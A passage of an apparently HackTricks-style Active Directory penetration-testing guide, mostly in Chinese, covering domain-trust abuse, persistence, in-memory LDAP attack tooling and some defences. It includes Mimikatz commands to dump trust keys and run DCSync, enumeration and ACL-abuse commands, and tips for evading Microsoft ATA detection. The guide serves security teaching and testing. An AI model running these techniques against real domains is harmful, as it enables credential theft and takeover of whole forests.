{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建你自己的 SSP 来**以明文捕获**用于访问机器的**凭证**。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它在 AD 中注册一个**新的 Domain Controller**并使用它来**推送属性**（如 SIDHistory、SPNs...）到指定对象，且不会留下有关这些**修改**的任何**日志**。你需要 DA 权限并处于**root domain**。\
注意，如果你使用错误的数据，会出现相当难看的日志。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

之前我们讨论了如果你有**足够权限读取 LAPS 密码**，如何提升权限。然而，这些密码也可以用于**维持持久化**。\
查看：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着**攻陷单个域可能导致整个 Forest 被攻陷**。

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许来自一个**域**的用户访问另一个**域**中的资源。它本质上在两个域的认证系统之间创建了链接，使认证验证可以无缝流动。当域建立信任时，它们在各自的 **Domain Controllers (DCs)** 中交换并保留用于信任完整性的特定**密钥**。

在典型场景中，如果用户希望访问**被信任域**中的服务，他们必须先从自己域的 DC 请求一个特殊票据，称为 **inter-realm TGT**。这个 TGT 使用两个域之间约定的共享**密钥**进行加密。然后用户将该 TGT 提交给**被信任域的 DC**以获取服务票据（**TGS**）。当被信任域的 DC 验证 inter-realm TGT 有效后，它会签发 TGS，从而授予用户访问该服务的权限。

**步骤**：

1. **Domain 1** 中的一台**客户端计算机**使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)** 开始该过程。
2. 如果客户端认证成功，DC1 会签发一个新的 TGT。
3. 然后客户端向 DC1 请求一个**inter-realm TGT**，这是访问 **Domain 2** 资源所需的。
4. inter-realm TGT 使用作为双向域信任一部分的 DC1 和 DC2 之间共享的 **trust key** 加密。
5. 客户端将 inter-realm TGT 带到 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用其共享的 trust key 验证 inter-realm TGT，如果有效，则为客户端想要访问的 Domain 2 中的服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，客户端将该 TGS 提交给服务器，该票据使用服务器帐户 hash 加密，以获取对 Domain 2 中服务的访问。

### Different trusts

重要的是要注意，**trust 可以是单向或双向**。在双向选项中，两个域将互相信任，但在**单向**信任关系中，其中一个域将成为**trusted**，另一个为**trusting**。在后一种情况下，**你只能从被信任域访问 trusting 域内的资源**。

如果 Domain A 信任 Domain B，则 A 是 trusting domain，B 是 trusted domain。此外，在 **Domain A** 中，这将是一个**Outbound trust**；而在 **Domain B** 中，这将是一个**Inbound trust**。

**不同的信任关系**

- **Parent-Child Trusts**：这是同一 forest 内的常见设置，子域自动与其父域形成双向传递信任。本质上，这意味着父域与子域之间可以无缝地流动认证请求。
- **Cross-link Trusts**：称为“shortcut trusts”，它们在子域之间建立以加速引用过程。在复杂的 forest 中，认证引用通常需要先到 forest 根然后再到目标域。通过创建 cross-links，可以缩短这一过程，这在地理分散的环境中特别有用。
- **External Trusts**：这些在不同、无关联的域之间设置，且本质上是非传递性的。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 在访问当前 forest 之外且未通过 forest trust 连接的域中的资源时很有用。安全性通过对 external trusts 使用 SID 过滤得到加强。
- **Tree-root Trusts**：这些信任在 forest 根域与新添加的 tree 根之间自动建立。尽管不常见，但 tree-root trusts 在向 forest 添加新域树时很重要，使其能够保持唯一域名并确保双向传递性。更多信息见 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这类型的信任是在两个 forest 根域之间建立的双向传递性信任，同时也强制实施 SID 过滤以增强安全措施。
- **MIT Trusts**：这些信任与非 Windows、符合 [RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立。MIT trusts 更加专业化，适用于需要与 Windows 生态系统之外的基于 Kerberos 的系统集成的环境。

#### Other differences in **trusting relationships**

- 一个信任关系也可以是**传递的**（A 信任 B，B 信任 C，则 A 信任 C）或**非传递的**。
- 一个信任关系可以设置为**双向信任**（双方互相信任）或**单向信任**（仅一方信任另一方）。

### Attack Path

1. **Enumerate** 信任关系
2. 检查是否有任何 **security principal**（用户/组/计算机）对**另一个域**的资源具有**访问**权限，可能通过 ACE 条目或成为另一个域的组成员。查找**跨域的关系**（信任可能就是为此创建的）。
1. kerberoast 在这种情况下也可能是另一个选项。
3. **Compromise** 可以**穿透**域的**账户**。

能够通过三种主要机制访问另一个域资源的攻击者包括：

- **Local Group Membership**：主体可能被添加到机器的本地组中，例如服务器上的 “Administrators” 组，从而授予他们对该机器的重大控制权。
- **Foreign Domain Group Membership**：主体也可以成为外部域内组的成员。然而，该方法的有效性取决于信任的性质和组的范围。
- **Access Control Lists (ACLs)**：主体可能在 **ACL** 中被列出，特别是在 **DACL** 中作为 **ACE** 的实体，从而被授予对特定资源的访问。对于想深入了解 ACL、DACL 和 ACE 工作机制的人，题为 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 的白皮书是非常有价值的资源。

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来查找域中的外部安全主体。这些将来自**外部域/forest**的用户/组。

你可以在 **Bloodhound** 中或使用 powerview 检查这一点：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
其他枚举域信任的方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 存在 **2 个受信任的密钥**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以使用以下命令查看当前域使用的密钥：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

通过滥用信任并使用 SID-History injection，将权限从 Enterprise admin 扩展到子域/父域：

{{#ref}}
sid-history-injection.md
{{#endref}}

#### 利用可写的 Configuration NC

理解如何利用 Configuration Naming Context (NC) 至关重要。Configuration NC 在 Active Directory (AD) 环境中充当跨林配置数据的中央存储库。此数据会复制到林中的每个 Domain Controller (DC)，可写的 DC 会保有 Configuration NC 的可写副本。要利用它，必须在某个 DC 上拥有 **SYSTEM 特权**，最好是 child DC。

**将 GPO 链接到 root DC site**

Configuration NC 的 Sites 容器包含 AD 林中所有域加入计算机 site 的信息。通过在任一 DC 上以 SYSTEM 特权 操作，攻击者可以将 GPOs 链接到 root DC sites。此操作可能通过操纵应用到这些 sites 的策略来危及 root domain。

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

一个攻击向量是针对域内的特权 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。在任一 DC 上拥有 **SYSTEM 特权** 的情况下，可以访问 KDS Root key 并计算整个林中任意 gMSA 的密码。

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

该方法需要耐心，等待新的特权 AD 对象的创建。拥有 SYSTEM 特权 的攻击者可以修改 AD Schema，授予任意用户对所有类的完全控制。这可能导致对新创建的 AD 对象的未授权访问和控制。

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 漏洞针对对 Public Key Infrastructure (PKI) 对象的控制，以创建一个证书模板，从而允许以林中任意用户的身份进行身份验证。由于 PKI 对象位于 Configuration NC 中，攻陷一个可写的 child DC 可以执行 ESC5 攻击。

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### 外部林域 - 单向（入站）或双向
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在此场景中，**your domain is trusted** by an external one，从而赋予你对该 external domain 的 **undetermined permissions**。你需要找出你域中哪些 **principals** 对外部域拥有哪些访问权限，然后尝试利用它：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - 单向（Outbound）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在此场景中，**你的域** 正在将某些 **权限** 授予来自 **不同域** 的主体（principal）。

然而，当一个 **域被信任** 时，被信任的域会 **创建一个用户**，该用户使用 **可预测的名称** 并以 **受信任的密码** 作为其 **密码**。这意味着可以 **访问来自信任域的用户以进入受信任域**，对其进行枚举并尝试提升更多权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种入侵受信任域的方法是找到在域信任的 **相反方向** 创建的[**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这并不常见）。

另一种入侵受信任域的方法是在某台机器上等待一个 **来自受信任域的用户可以通过 RDP 登录**。然后，攻击者可以在 RDP 会话进程中注入代码，并从那里 **访问受害者的原始域**。\
此外，如果 **受害者挂载了他的硬盘**，攻击者可以从 **RDP 会话** 进程在 **硬盘的启动文件夹** 中存放 **backdoors**。该技术称为 **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解

### **SID Filtering:**

- 通过 SID Filtering 可以缓解利用 SID history 属性跨林信任的攻击风险，SID Filtering 在所有林间信任上默认启用。其假设是将森林（forest）而非域(domain) 作为安全边界，这与 Microsoft 的立场一致，因此认为林内信任是安全的。
- 但有一个问题：SID Filtering 可能会破坏某些应用程序和用户访问，因此有时会被停用。

### **Selective Authentication:**

- 对于林间信任，使用 Selective Authentication 可确保来自两个林的用户不会被自动认证。相反，需要为用户显式授予访问信任域或林内域和服务器的权限。
- 需要注意的是，这些措施不能防止对可写 Configuration Naming Context (NC) 的利用或对信任帐户的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## 基于 LDAP 的 AD 滥用（来自本机植入物）

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD-style 的 LDAP 原语重新实现为在本机植入物（例如 Adaptix C2）中完全运行的 x64 Beacon Object Files。操作员使用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译包，加载 `ldap.axs`，然后从 beacon 中调用 `ldap <subcommand>`。所有流量都使用当前登录的安全上下文通过 LDAP (389)（带签名/加密）或 LDAPS (636)（自动证书信任）传输，因此无需 socks 代理或磁盘痕迹。

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` 将短名/OU 路径解析为完整的 DNs 并转储相应对象。
- `get-object`, `get-attribute`, and `get-domaininfo` 提取任意属性（包括安全描述符）以及来自 `rootDSE` 的 forest/domain 元数据。
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` 直接从 LDAP 暴露 roasting 候选项、委派设置和已有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 描述符。
- `get-acl` and `get-writable --detailed` 解析 DACL，列出受托人、权限（GenericAll/WriteDACL/WriteOwner/属性写入）和继承信息，为 ACL 提权提供直接目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 写入原语用于提权 & 持久化

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 允许操作者在存在 OU 权限的任何位置部署新的 principals 或 machine accounts。`add-groupmember`, `set-password`, `add-attribute`, 和 `set-attribute` 在发现 write-property 权限后可直接劫持目标。
- 以 ACL 为中心的命令如 `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, 和 `add-dcsync` 将任意 AD 对象上的 WriteDACL/WriteOwner 转换为密码重置、组成员控制或 DCSync 复制权限，且不会留下 PowerShell/ADSI 痕迹。对应的 `remove-*` 命令可清理注入的 ACE。

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` 可立即使被攻陷用户变为 Kerberoastable；`add-asreproastable`（UAC 切换）在不触及密码的情况下将其标记为可进行 AS-REP roasting。
- Delegation 宏（`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`）可从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而开启 constrained/unconstrained/RBCD 攻击路径，并消除对远程 PowerShell 或 RSAT 的需求。

### sidHistory 注入、OU 迁移与攻击面塑造

- `add-sidhistory` 将特权 SID 注入受控主体的 SID history（见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 提供隐蔽的访问继承。
- `move-object` 更改计算机或用户的 DN/OU，允许攻击者在滥用 `set-password`、`add-groupmember` 或 `add-spn` 之前将资产拖入已存在委派权限的 OU。
- 范围严格的移除命令（`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` 等）允许在操作者收集凭证或持久化后快速回滚，最小化遥测。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御措施

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **凭证保护的防御措施**

- **域管理员限制**：建议域管理员（Domain Admins）仅被允许登录到域控制器（Domain Controllers），避免在其他主机上使用。
- **服务帐户权限**：服务不应以域管理员 (DA) 权限运行以维持安全性。
- **临时权限限制**：对需要 DA 权限的任务，应限制其持续时间。可通过以下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 缓解**：审计事件 ID 2889/3074/3075，然后在 DCs/clients 上强制启用 LDAP signing 以及 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **实施欺骗技术（Deception Techniques）**

- 实施欺骗涉及设置陷阱，如诱饵用户或计算机，具有密码永不过期或被标记为 Trusted for Delegation 等特性。详细方法包括创建具有特定权限的用户或将其添加到高权限组。
- 一个实用示例（使用工具）: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署欺骗技术的更多信息请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **识别欺骗**

- **针对用户对象**：可疑指标包括不典型的 ObjectSID、罕见的登录、创建日期异常，以及较低的错误密码计数。
- **一般性指标**：将潜在诱饵对象的属性与真实对象进行比较可发现不一致之处。工具如 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 可协助识别此类欺骗。

### **绕过检测系统**

- **Microsoft ATA 检测绕过**：
- **用户枚举**：避免在域控制器上进行会话枚举以防触发 ATA 检测。
- **票据模拟**：使用 **aes** 密钥创建票据可帮助躲避检测，因为不会降级到 NTLM。
- **DCSync 攻击**：建议从非域控制器执行以避免 ATA 检测，直接在域控制器上执行会触发告警。

## 参考资料

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
